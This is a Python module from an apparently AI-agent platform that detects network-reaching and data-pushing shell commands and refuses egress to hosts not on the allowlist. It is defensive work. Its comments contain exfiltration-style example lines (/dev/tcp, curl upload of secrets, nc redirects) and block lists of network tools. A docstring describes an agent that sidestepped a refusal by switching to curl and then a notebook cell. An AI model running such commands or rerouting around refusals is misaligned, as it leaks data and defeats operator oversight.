"""Reading a shell command for network use: which hosts it reaches, whether it
writes or pushes data, and why a command is refused."""
from __future__ import annotations

import os
import re

# Hosts named more than once (``_GOOGLE_APIS`` also in egress.py) — a scanner
# counts three of the same string as a maintenance hazard, and it is right that
# the cloud endpoint and the "mixed" search host should be the same name.
_AWS = "amazonaws.com"
_GOOGLE_APIS = "googleapis.com"
_DOCKER_HUB = "docker.io"


def _pkg():
    """``egress``, the module this code was split from, looked up on each call.

    Only names read through here follow a patch on ``egress``; patch any other
    name on this module."""
    import aiforge_core.net.egress as package
    return package


# Shell tools that FETCH. A command line naming one of these carries the same
# question as web_fetch — may this box talk to that host — and used to carry it
# past every gate, because the classifier only asked whether a command was
# DANGEROUS and this one is not.
_NET_COMMANDS = frozenset({
    "curl", "wget", "http", "https", "httpie", "xh", "aria2c",
    "nc", "ncat", "netcat", "telnet", "ftp", "sftp", "lynx", "w3m", "links",
    "youtube-dl", "yt-dlp",
})
# Interpreters that fetch when handed a program on the command line. `python -c
# "import requests; requests.get(...)"` names no fetcher at all, which is the
# obvious next thing to try once curl is refused.
_INTERPRETERS = frozenset({"python", "python2", "python3", "node", "ruby",
                           "perl", "php", "deno", "bun"})
_INLINE_FLAGS = ("-c", "-e", "--eval", "--execute")
_URL_RE = re.compile(r"""(?:^|[\s"'=(])((?:https?|ftp)://[^\s"'`)|;<>]+)""",
                     re.IGNORECASE)
# A bare host as `curl example.com` / `nc host 443` takes it. The last label
# must look like a TLD (letters), which is also what keeps `curl -o out.html`
# from reading its OUTPUT FILE as a destination — the false positive that would
# have refused a perfectly allowed fetch because of the -o argument.
_BARE_HOST_RE = re.compile(
    r"^(?!-)[A-Za-z0-9-]{1,63}(?:\.[A-Za-z0-9-]{1,63})*\.[A-Za-z]{2,24}$")
_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
# Options whose VALUE is a local path, never a destination.
# Endings that make a token a local file rather than a host. `curl out.html`
# with no -o is rare, but reading an output filename as a destination refuses a
# fetch the operator explicitly allowed — a false refusal is how a control
# earns the reputation that gets it switched off.
_FILE_EXTS = frozenset({
    "html", "htm", "json", "txt", "log", "md", "yml", "yaml", "csv", "tsv",
    "xml", "png", "jpg", "jpeg", "gif", "svg", "pdf", "zip", "gz", "tar",
    "tgz", "bz2", "xz", "sh", "py", "js", "ts", "rb", "go", "rs", "java",
    "conf", "cfg", "ini", "toml", "env", "lock", "sql", "db", "bin", "out",
})
_FILE_FLAGS = ("-o", "--output", "-O", "-T", "--upload-file", "-D",
               "--dump-header", "-K", "--config", "-b", "--cookie",
               "-c", "--cookie-jar", "--cacert", "--cert", "--key")


# ── data going the OTHER way ────────────────────────────────────────────────
# Fetching was only half of it. A command that PUSHES — scp, rsync, an upload
# flag on curl, a mail client, a cloud CLI, or the bash /dev/tcp trick — sends
# OUR bytes out, which is the direction that matters most and named no fetcher
# at all. Same question, opposite arrow.
_PUSH_COMMANDS = frozenset({
    "scp", "rsync", "sftp", "ssh", "mail", "mailx", "sendmail", "mutt",
    "rclone", "s3cmd", "gsutil", "aws", "az", "gcloud", "kubectl", "docker",
    "podman", "skopeo", "twine", "npm", "pip", "gh", "glab",
})
# Flags that turn a fetcher into an UPLOAD. `curl -d @secrets https://host` is
# a read of the host and a write of our data, and only the second one is
# exfiltration.
_UPLOAD_FLAGS = frozenset({
    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
    "-F", "--form", "-T", "--upload-file", "--post-file", "--post-data",
    "--post-data-file", "-u", "--upload",
})
_WRITE_METHOD_ARGS = frozenset({"POST", "PUT", "PATCH", "DELETE"})
# `user@host:/path` and `host:/path` — how scp and rsync name a destination.
_SSH_TARGET_RE = re.compile(
    r"^(?:[A-Za-z0-9._%+-]+@)?((?!-)[A-Za-z0-9-]{1,63}"
    r"(?:\.[A-Za-z0-9-]{1,63})*\.(?:[A-Za-z]{2,24})|\d{1,3}(?:\.\d{1,3}){3})"
    r":(?:.*)?$")
_SSH_HOST_RE = re.compile(
    r"^[A-Za-z0-9._%+-]+@((?!-)[A-Za-z0-9.-]+)$")
# bash's own socket: `cat secrets > /dev/tcp/1.2.3.4/443`. No binary involved,
# so nothing that looks for a command name will ever see it.
_DEV_TCP_RE = re.compile(r"/dev/(?:tcp|udp)/([A-Za-z0-9._-]+)/\d+")


def _is_pusher(token: str) -> bool:
    return token.rsplit("/", 1)[-1].lower() in _PUSH_COMMANDS


def _writes_data(tokens: list[str], text: str) -> bool:
    """Does this command line send OUR bytes out, rather than pull bytes in?"""
    if any(_is_pusher(t) for t in tokens):
        return True
    if any(t in _UPLOAD_FLAGS for t in tokens):
        return True
    for i, tok in enumerate(tokens[:-1]):
        if tok in ("-X", "--request") and tokens[i + 1].upper() in _WRITE_METHOD_ARGS:
            return True
    # `nc host 443 < secrets` / `... | nc host 443` — the redirect is the verb.
    return bool(re.search(r"<\s*[^\s|;&]+", text) and
                any(_is_fetcher(t) for t in tokens))


# A cloud CLI names a BUCKET, not a host: `aws s3 cp dump.sql s3://b/x` says
# nothing a host allowlist can match, and it is one of the shortest paths from
# "I have the data" to "the data is off the box". Map the tool to the endpoint
# it actually talks to, so the ordinary rules apply to it.
_CLOUD_HOSTS = {
    "aws": _AWS, "s3cmd": _AWS,
    "gsutil": _GOOGLE_APIS, "gcloud": _GOOGLE_APIS,
    "az": "blob.core.windows.net", "rclone": "rclone.invalid",
    "twine": "pypi.org", "npm": "registry.npmjs.org",
    "docker": _DOCKER_HUB, "podman": _DOCKER_HUB, "skopeo": _DOCKER_HUB,
}
_CLOUD_WRITE_VERBS = frozenset({"cp", "mv", "sync", "push", "publish",
                                "upload", "put", "copy"})


def _names_a_local_endpoint(tokens: list[str]) -> bool:
    """Does the line point the tool at something on this machine or the LAN?

    `docker push localhost:5000/img` and `aws --endpoint-url http://localhost:
    4566 s3 cp …` are a local registry and localstack. Mapping the TOOL to its
    public endpoint would refuse both, which is a control inventing a
    destination the command never named.
    """
    pkg = _pkg()
    for tok in tokens:
        host = pkg._host_of(tok.split("/", 1)[0] if "://" not in tok else tok)
        if host and pkg.is_local_host(host):
            return True
    return False


def _cloud_targets(tokens: list[str]) -> list[str]:
    """The endpoint a cloud CLI would push to, when it is pushing.

    Only for WRITE verbs: `aws s3 ls` reads, and refusing that would be a
    control doing more than it was asked. ``rclone`` maps to a name that can
    never resolve on purpose — its remote is configured out of band, so we
    cannot know the host and must not pretend we do.
    """
    names = [t.rsplit("/", 1)[-1].lower() for t in tokens]
    if not any(v in names for v in _CLOUD_WRITE_VERBS):
        return []
    if _names_a_local_endpoint(tokens):
        return []
    return [_CLOUD_HOSTS[n] for n in names if n in _CLOUD_HOSTS]


def _git_push_urls(tokens: list[str], text: str) -> list[str]:
    """A git push to an explicit URL.

    Named remotes are left alone deliberately: with a default-deny allowlist,
    treating every remote as egress would refuse `git push origin main` on a
    normal working day, and the caution tier already asks about a push. A URL
    typed on the command line is the shape that shows up when the remote is the
    point, not the code.
    """
    names = [t.rsplit("/", 1)[-1].lower() for t in tokens]
    if "git" not in names or "push" not in names:
        return []
    return [m.group(1) for m in _URL_RE.finditer(text)]


def _ssh_allowed() -> bool:
    """The operator's existing "I deploy to my own boxes" switch.

    ``AIFORGE_ALLOW_SSH`` already tells the risk classifier to let ssh-family
    commands run without a prompt. Refusing them here on the allowlist would
    take that back through a different door — and an operator who set it did
    not mean "except when it matters"."""
    return str(os.environ.get("AIFORGE_ALLOW_SSH", "")).strip().lower() in _pkg()._TRUE


_SSH_FAMILY = frozenset({"ssh", "scp", "rsync", "sftp"})


def _push_targets(tokens: list[str], text: str) -> list[str]:
    """Destinations named the way a PUSH names them: scp/rsync `host:path`,
    `ssh user@host`, and bash's `/dev/tcp/host/port`."""
    out: list[str] = []
    pushing = any(_is_pusher(t) for t in tokens)
    if _ssh_allowed() and any(
            t.rsplit("/", 1)[-1].lower() in _SSH_FAMILY for t in tokens):
        pushing = False
    for tok in tokens:
        if not pushing or tok.startswith("-"):
            continue
        m = _SSH_TARGET_RE.match(tok) or _SSH_HOST_RE.match(tok)
        if m:
            out.append(m.group(1))
    out += _DEV_TCP_RE.findall(text)
    out += _cloud_targets(tokens)
    out += _git_push_urls(tokens, text)
    return out


def _tokens(cmd: str) -> list[str]:
    """Shell-ish tokens. ``shlex`` is right about quoting and wrong about `&&`
    and pipes, so split on those first: a fetcher after a `;` is still a
    fetcher, and the whole point is that it does not have to be the first word.
    """
    import shlex
    out: list[str] = []
    for part in re.split(r"[|;&]+|\n", str(cmd or "")):
        try:
            out += shlex.split(part)
        except ValueError:          # unbalanced quotes: fall back to whitespace
            out += part.split()
    return out


def _is_fetcher(token: str) -> bool:
    """A fetcher named ANY way the shell accepts it — `curl`, `/usr/bin/curl`,
    `./curl`. Matching the bare word missed the absolute path, which is one
    keystroke away."""
    name = token.rsplit("/", 1)[-1].lower()
    return name in _NET_COMMANDS


def _has_inline_program(tokens: list[str]) -> bool:
    """Does this line hand an interpreter a program on the command line?

    Deliberately loose about WHERE the flag sits relative to the interpreter:
    the tokeniser splits on `;` and `&&`, so the two can land in different
    fragments — and a check that required adjacency would miss the shape it
    exists for."""
    names = {t.rsplit("/", 1)[-1].lower() for t in tokens}
    if not (names & _INTERPRETERS):
        return False
    return any(t in _INLINE_FLAGS for t in tokens)


def _bare_hosts(tokens: list[str]) -> list[str]:
    """Destinations given without a scheme, minus the arguments that are files."""
    out: list[str] = []
    fetching = False
    skip_next = False
    for i, tok in enumerate(tokens):
        if skip_next:
            skip_next = False
            continue
        if _is_fetcher(tok):
            fetching = True
            continue
        if tok in _FILE_FLAGS:
            skip_next = True
            continue
        if not fetching or tok.startswith("-"):
            continue
        candidate = tok.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]
        if candidate.lower().rsplit(".", 1)[-1] in _FILE_EXTS:
            continue            # `curl out.html …` names a file, not a host
        if _IPV4_RE.match(candidate) or _BARE_HOST_RE.match(candidate):
            out.append(tok)     # keep the PATH: the policy reads the query too
        del i
    return out


def urls_in_command(cmd: str) -> list[str]:
    """Every destination this command line would reach.

    Five shapes, because an agent that has just been refused tries all of them:
    an explicit URL, a bare host after a fetcher, a URL inside a `python -c`
    program, an scp/rsync/ssh target, and bash's own `/dev/tcp/host/port`.
    """
    text = str(cmd or "")
    tokens = _tokens(text)
    found: list[str] = []
    if any(_is_fetcher(t) for t in tokens) or any(_is_pusher(t) for t in tokens):
        found += [m.group(1) for m in _URL_RE.finditer(text)]
        found += _bare_hosts(tokens)
    found += _push_targets(tokens, text)
    if _has_inline_program(tokens):
        # Scan the WHOLE line, not the extracted program: `python -c "import
        # requests; requests.get('…')"` contains a `;`, and any tokeniser worth
        # having splits on that — which put the URL in a different fragment
        # from the -c and made this exact case, the one an agent reaches for
        # after curl is refused, read as harmless.
        found += re.findall(r"""(?:https?|ftp)://[^\s"'`)]+""", text)
    out: list[str] = []
    for u in found:
        if u not in out:
            out.append(u)
    return out


def _write_refusal(url: str) -> dict | None:
    """The extra questions a WRITE has to answer, on top of "may we reach it".

    Reading pulls bytes in; writing pushes ours out, and only the second one is
    exfiltration — which is why a host an operator added in Settings is
    readable and not writable, and why an unattended run may not write at all.
    Those rules already governed the integration and email paths; a shell
    command was simply not asking them.
    """
    pkg = _pkg()
    if not pkg._host_is_writable(url):
        return {"ok": False, "error": "host_not_writable",
                "hint": ("this host may be READ but not written to: a "
                         "destination that receives our data has to be a "
                         "configured integration, not an entry someone added "
                         "to browse. Report what you would have sent.")}
    if not pkg.attended() and not pkg._env_true("AIFORGE_UNATTENDED_WRITES"):
        return {"ok": False, "error": "unattended_write_refused",
                "hint": ("this run has no human attached, so sending data to "
                         "an external system is refused. Report what you would "
                         "have sent; an operator can set "
                         "AIFORGE_UNATTENDED_WRITES=1 to allow it.")}
    return None


def command_refusal(cmd: str) -> dict | None:
    """``None`` unless a shell command would reach a destination this box may
    not reach.

    THE HOLE THIS CLOSES, reported from a live session: web_fetch refused a URL
    because the host was not on the allowlist, and the agent immediately reran
    it as `curl` — and then, when that was refused, inside a notebook cell —
    until something worked. Every one of those is the same request; only the
    transport changed. A refusal that can be walked around by changing
    transport is a suggestion, and the operator was told it was a boundary.

    This is a policy gate, not containment: a determined agent can still open a
    socket in code, which is why `kernel_egress` guards the notebook kernel and
    why the ``net.egress`` module docstring is explicit that an OS firewall is
    the real line.
    What it stops is the ROUTINE reroute, which is what actually happens.
    """
    pkg = _pkg()
    text = str(cmd or "")
    writes = _writes_data(_tokens(text), text)
    for target in urls_in_command(cmd):
        url = target if "://" in target else "https://" + target
        if pkg.is_local_host(pkg._host_of(url)):
            continue        # this machine / the LAN is not egress, either way
        refusal = pkg.check(url) or (_write_refusal(url) if writes else None)
        if refusal is not None:
            return {**refusal,
                    "error": f"{refusal.get('error')} (via a shell command)",
                    "hint": (str(refusal.get("hint") or "") +
                             " Reaching it with curl / wget / a notebook cell "
                             "is the SAME request through another transport — "
                             "it is refused too. Ask the user to add the host "
                             "in Settings -> Egress, or to paste the content.")}
    return None
